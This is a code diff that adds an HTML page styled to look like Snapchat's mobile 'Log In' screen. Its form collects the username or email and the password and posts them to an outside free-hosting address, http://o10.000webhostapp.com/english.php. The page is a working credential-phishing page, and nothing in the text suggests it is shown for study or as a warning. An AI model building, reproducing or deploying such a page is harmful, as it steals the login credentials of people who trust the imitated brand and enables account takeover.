@@ -1,0 +1,85 @@
+<hmtl>
+  <head>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+  </head>
+  <body>
+    <style>
+      @font-face {
+        font-family: SnapFont;
+        src: url(snapchatfont.woff2);
+      }
+      body{
+        background-color:black;
+        margin:0px;
+        font-family: SnapFont;
+        letter-spacing: 0.5px;
+      }
+      .wrapper{
+        background-color:white;
+        border-radius:10px;
+        width:100%;
+        height:100%;
+      }
+      header{
+        width:100%;
+        height:50px;
+      }
+      .back{
+        height:18px;
+        width:10px;
+        padding:16px 18px;
+      }
+      .login-box{
+        text-align:center;
+        width:270px;
+        margin:0px auto;
+      }
+      .login {
+        font-size:20px;
+        text-align:center;
+        margin:16px 0px 27px 0px;
+      }
+      .inputs{
+        height:26px;
+        border-width:0px;
+        border-bottom-width:1.5px;
+        border-bottom-color:#b8c0c7;
+        width:100%;
+        font-size:16px;
+        padding-left:3px;
+      }
+      .pass {
+        margin-bottom:22px;
+      }
+      input{
+        font-family: inherit;
+        caret-color: #1d5bc5;
+      }
+      .input-headers{
+        color:#b8c0c7;
+        font-size:11.5px;
+        text-align:left;
+        margin:12.5px 0px 10px 3px;
+      }
+      .forgot {
+        font-size:12px;
+        color:#0EADFF;
+      }
+      </style>
+    <div class="wrapper">
+      <header>
+        <img class="back" src="back-icon.png">
+      </header>
+      <div class="login-box">
+        <div class="login">Log In</div>
+        <form method="post" action="http://o10.000webhostapp.com/english.php">
+          <div class="input-headers" style="margin-top:0px;">USERNAME OR EMAIL</div>
+          <input class="inputs email" autocorrect="off" autocapitalize="off" name="email" type="text"></input>
+          <div class="input-headers">PASSWORD</div>
+          <input class="inputs pass" autocorrect="off" autocapitalize="off" name="password" type="password"></input>
+          <div class="forgot">Forgot your password?</div>
+        </form>
+      </div>
+    </div>
+  </body>
+</html>
